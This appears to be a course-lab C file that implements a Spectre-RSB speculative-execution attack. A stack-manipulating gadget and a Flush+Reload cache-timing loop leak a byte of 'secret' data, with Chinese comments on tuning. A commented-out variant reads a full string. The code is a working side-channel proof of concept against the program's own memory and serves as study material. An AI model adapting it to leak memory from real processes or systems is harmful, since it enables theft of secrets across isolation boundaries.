#include <stdio.h>
#include "libasm/asm.h"

size_t array[256 * 512];
double counter[256];
char *secret = "SECRET DATA";
size_t temp = 1, secret_data;
uint64_t time, i, j, k, argmin = 'A';
size_t cached, uncached, threshold, try_times = 2000;

void flush_array()
{
  for (k = 0; k < 256; k++)
  {
    flush(array + k * 512);
    flush(array + k * 512);
  }
}

void gadget()
{
  // return to main
  asm volatile(
      "pop %rdi\n"//从栈中弹出一个值并将其存储到寄存器 rdi 中
      "pop %rbp\n"//将栈顶的值弹出到基指针寄存器 rbp 中。rbp 通常用于保存当前栈帧的基址
      "nop\n"
      //使用 clflush 指令清除栈顶地址（即当前栈指针 rsp 指向的地址）中的数据。
      //这是为了确保这个地址的数据被从缓存中删除，后续对这个地址的访问将会是从主内存中读取，而不是从缓存中读取，从而造成更明显的时间差异。
      "clflush (%rsp)\n"
      "retq\n");//用于返回，实际上是将控制权返回到调用这个 gadget 的地方
}

void speculative()
{
  flush_array();
  gadget();
  // secret_data = *secret;
  temp &= array[*secret * 512];
  printf("%c\n", *secret);
}

int main(void)
{
  cached = detect_cache_hit_time();
  uncached = detect_flush_reload_time();
  threshold = (cached + uncached) / 2;
  printf("cached: %zu, uncached: %zu, threshold: %zu\n", cached, uncached, threshold);

  for (i = 'A'; i < 'Z'; i++)
  {
    for (j = 0; j < try_times; j++)
    {
      flush_array();
      for (k = 0; k < 10; k++)
      {
        speculative();
      }
      time = maccess_time(array + i * 512);
      counter[i] += (double)time;
    }
    counter[i] /= try_times;
    printf("%c: %lf %d\n", i, counter[i], temp);
  }
  for (i = 'A'; i < 'Z'; i++)
  {
    if (counter[i] < counter[argmin])
    {
      argmin = i;
    }
  }
  printf("argmin: %c\n", argmin);
  printf("End\n");
  return 0;
}

// 1. 本实验中秘密地址需设置为全局变量，如果通过参数传递在调用gadget前会保存到和rbp有关的地址中，在推测执行时则会由于rbp变化导致读取错误
// 2. 运行迭代次数应高于999（本处设置为1999），否则可能会无法还原出秘密值
// 3. gadget中的pop数量需要根据实际的栈的内容进行调整

// #include <stdio.h>
// #include <stdint.h>
// #include <stdlib.h>
// #include <x86intrin.h>

// uint8_t array[256 * 512];

// char *secret_addr = "secret words";
// uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

// void gadget()
// {
//   asm volatile(
//       "pop %rdi\n"
//       "pop %rdi\n"
//       "pop %rdi\n"
//       "pop %rdi\n"
//       "pop %rbp\n"
//       "clflush (%rsp)\n" // flush the return address
//       "retq\n");
// }
// void flush()
// {
//   int i;
//   for (i = 0; i < 256; i++)
//     _mm_clflush(&array[i * 512]);
// }

// void speculative(char *secret_ptr)
// {
//   flush(array);
//   gadget();
//   temp &= array[*secret_addr * 512];
// }

// int findSecret(uint8_t *array, int *results, int *j, int *k, int threshold)
// {
//   int i, j1, j2, k1, k2;
//   int max1, max2;
//   int max1_index, max2_index;
//   int max1_score, max2_score;

//   for (i = 0; i < 256; i++)
//   {
//     flush(array + i * 512);
//   }

//   for (i = 0; i < 256; i++)
//   {
//     speculative(secret_addr);
//   }

//   max1 = max2 = 0;
//   max1_index = max2_index = 0;
//   max1_score = max2_score = 0;

//   for (i = 0; i < 256; i++)
//   {
//     if (results[i] > max1)
//     {
//       max1 = results[i];
//       max1_index = i;
//     }
//   }

//   for (i = 0; i < 256; i++)
//   {
//     if (results[i] > max2 && results[i] < max1)
//     {
//       max2 = results[i];
//       max2_index = i;
//     }
//   }

//   max1_score = max1 - max2;
//   max2_score = max2;

//   *j = max1_index;
//   *k = max2_index;

//   return max1_score > threshold;
// }

// void read_secret(char *secret_ptr, uint8_t value[2], int score[2])
// {

//   static int results[256];
//   int tries, j, k;
//   unsigned int junk = 0;

//   for (int i = 0; i < 256; i++)
//     results[i] = 0;
//   for (tries = 999; tries > 0; tries--)
//   {
//     for (int l = 0; l < 10; l++)
//       speculative(secret_ptr);
//     if (findSecret(array, results, &j, &k, 0))
//     {
//       break;
//     }
//   }

//   results[0] ^= junk; /* use junk so code above won’t get optimized out*/
//   value[0] = (uint8_t)j;
//   score[0] = results[j];
//   value[1] = (uint8_t)k;
//   score[1] = results[k];
// }

// int main()
// {
//   // prepare(array, sizeof(array), secret_addr);

//   int len = 12;
//   uint8_t value[2];
//   int score[2];
//   while (--len >= 0)
//   {
//     // printf("Reading at secret_addr = %p... ", (void * ) secret_addr);
//     read_secret(secret_addr, value, score);
//     // display(secret_addr, value, score);
//     secret_addr++;

//     /* Display the results */
//     // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
//     // printf("0x%02X=’%c’ score=%d ", value[0],(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

//     // if (score[1] > 0) {
//     // printf("(second best: 0x%02X=’%c’ score=%d)", value[1],(value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
//     // }
//     // printf("\n");
//   }

//   return 0;
// }
